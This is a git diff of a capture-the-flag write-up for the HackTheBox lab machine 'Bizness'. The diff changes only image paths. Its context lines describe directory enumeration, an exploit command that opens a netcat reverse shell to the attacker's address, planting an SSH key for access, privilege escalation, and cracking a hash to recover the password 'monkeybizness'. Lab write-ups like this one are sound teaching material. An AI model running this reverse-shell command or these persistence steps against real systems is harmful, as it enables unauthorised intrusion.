@@ -40,7 +40,7 @@ Discovered open port 41619/tcp on 10.10.11.252
 5 port only open for this website but i think this port cant do anything so lets enum directory to find vulnerability to exploit it
 
 
-![](2024-01-21-12-45-05.png)
+![](/images/bizness/2024-01-21-12-45-05.png)
 
 First of all usually me using gobuster for scanning directory but now not working because so i using dirb to scanning directory and its working
 
@@ -66,7 +66,7 @@ First of all usually me using gobuster for scanning directory but now not workin
 
 lets check `/accounting` directory
 
-![](2024-01-21-12-57-36.png)
+![](/images/bizness/2024-01-21-12-57-36.png)
 &nbsp;
 
 
@@ -83,7 +83,7 @@ now install the tools and running in your linux
 
 `python3 exploit.py --url https://bizness.htb --cmd "nc 10.10.14.116 1337 -c /bin/bash"`
 
-![](2024-01-21-13-05-31.png)
+![](/images/bizness/2024-01-21-13-05-31.png)
 
 revshell connected . To login ssh go to your linux generate your id_rsa using `ssh-keygen`
 and you just enter until completed . After you generated running this command `cat id_rsa.pub` in /home/kali/.ssh/ and copy your id_rsa.pub and follow my step the below
@@ -98,7 +98,7 @@ and you just enter until completed . After you generated running this command `c
 
 Now you can login ssh
 
-![](2024-01-21-13-15-41.png)
+![](/images/bizness/2024-01-21-13-15-41.png)
 &nbsp;
 
 
@@ -112,7 +112,7 @@ Now you can login ssh
 
 ## Privilege Escalation
 
-![](2024-01-21-13-27-59.png)
+![](/images/bizness/2024-01-21-13-27-59.png)
 
 I found files maybe can privilege escalation . I've using linpeas to scanning and trying to priv esc it .
 
@@ -225,12 +225,12 @@ with open(wordlist, 'r', encoding='latin-1') as password_list:
             break  # Stop the loop if a match is found
 ```
 
-![](2024-01-21-14-26-27.png)
+![](/images/bizness/2024-01-21-14-26-27.png)
 
 nah has been cracked 
 The Password is : `monkeybizness`
 
-![](2024-01-21-14-27-46.png)
+![](/images/bizness/2024-01-21-14-27-46.png)
 
 
 I hope you all enjoy my writeup : )
